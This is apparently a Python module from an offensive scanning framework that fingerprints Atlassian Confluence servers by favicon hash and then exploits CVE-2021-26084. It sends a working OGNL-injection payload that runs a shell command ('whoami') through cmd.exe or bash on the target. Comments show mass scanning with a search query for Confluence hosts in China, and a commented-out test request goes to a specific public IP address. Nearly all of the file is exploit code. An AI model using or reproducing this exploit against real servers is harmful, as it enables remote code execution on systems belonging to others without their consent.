# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-11 13:11

import hashlib

from bs4 import BeautifulSoup
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# 966e60f8eb85b7ea43a7b0095f3e2336
# app="ATLASSIAN-Confluence" && country="CN"
# python batch.py -m exploit.web.Atlassian.Confluence.unauth_rce -cs -fs "app=\"ATLASSIAN-Confluence\" && country=\"CN\""

class Script(BaseScript):
    name = 'Confluence'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = 'CVE-2021-26084'
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/pages/createpage-entervariables.action?SpaceKey=x']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = '''
        Confluence < 6.13.23
        6.14.0 ≤ Confluence < 7.4.11
        7.5.0 ≤ Confluence < 7.11.6
        7.12.0 ≤ Confluence < 7.12.5
        Confluence < 7.13.0
        
        Confluence Server Webwork OGNL injection
        '''
        self.favicon = ['966e60f8eb85b7ea43a7b0095f3e2336']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('Confluence Finger', url))
                                    return {'name': 'Confluence Finger', 'url': url, 'software': 'Confluence'}
        except Exception:
            return None

    async def exec(self):
        try:
            headers = self.headers.copy()
            headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
                "Connection": "close",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate"})
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    async with session.post(url=url, data={"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022whoami\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}, timeout=10, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.text()
                            await asyncio.sleep(2)
                            soup = BeautifulSoup(text, 'html.parser')
                            queryStringValue = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})
                            if queryStringValue.get('value', ''):
                                tqdm.write(Fore.RED + '[{}] {}'.format('Confluence RCE', url))
                                return {'name': 'Confluence RCE', 'url': url, 'software': 'Confluence'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    semaphore = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:8090', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
